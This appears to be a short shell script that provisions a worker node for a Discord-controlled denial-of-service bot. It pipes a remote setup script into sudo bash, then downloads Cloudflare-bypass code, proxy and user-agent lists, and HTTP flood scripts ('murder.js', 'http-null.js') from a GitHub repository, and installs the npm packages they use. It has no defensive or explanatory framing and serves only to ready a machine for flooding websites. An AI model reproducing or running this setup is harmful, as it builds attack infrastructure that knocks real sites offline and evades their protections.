curl -sL https://deb.nodesource.com/setup_14.x | sudo -E bash -
apt-get install -y nodejs
apt-get install -y npm
wget https://raw.githubusercontent.com/DefinitelyNotJah/discordDosBot/master/slave/stopdos.sh
wget https://raw.githubusercontent.com/DefinitelyNotJah/discordDosBot/master/slave/cloudflarebypass/cfbypass.js
wget https://raw.githubusercontent.com/DefinitelyNotJah/discordDosBot/master/slave/cloudflarebypass/proxies.txt
wget https://raw.githubusercontent.com/DefinitelyNotJah/discordDosBot/master/slave/cloudflarebypass/ua.txt
wget https://raw.githubusercontent.com/DefinitelyNotJah/discordDosBot/master/slave/httpmurder/murder.js
wget https://github.com/DefinitelyNotJah/discordDosBot/blob/master/slave/httpmurder/murder.txt
wget https://raw.githubusercontent.com/DefinitelyNotJah/discordDosBot/master/slave/rawhttpnull/http-null.js
npm init -y
npm install cloudscraper randomstring socks-proxy-agent request
